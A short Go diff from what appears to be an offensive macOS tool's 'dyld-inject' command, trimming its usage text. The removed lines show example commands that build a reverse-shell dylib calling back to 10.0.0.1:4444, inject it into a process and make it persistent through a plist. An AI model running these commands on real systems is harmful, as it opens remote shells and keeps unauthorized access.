@@ -25,18 +25,7 @@ func (c *DYLDInjectionCommand) Name() string {
 func (c *DYLDInjectionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
 		return CommandResult{
-			Output: `Usage: dyld-inject <action> [options]
-Actions:
-  test      - Test DYLD injection (check if SIP allows it)
-  generate  - Generate a dylib for injection
-  inject    - Inject dylib into a process/command
-  persist   - Add persistent DYLD injection
-
-Examples:
-  dyld-inject test
-  dyld-inject generate --output /tmp/evil.dylib --payload reverse-shell --host 10.0.0.1 --port 4444
-  dyld-inject inject --dylib /tmp/evil.dylib --target /usr/bin/whoami
-  dyld-inject persist --dylib /tmp/evil.dylib --method plist`,
+			Output: "Usage: dyld-inject <action> [options]",
 			ExitCode: 1,
 		}
 	}
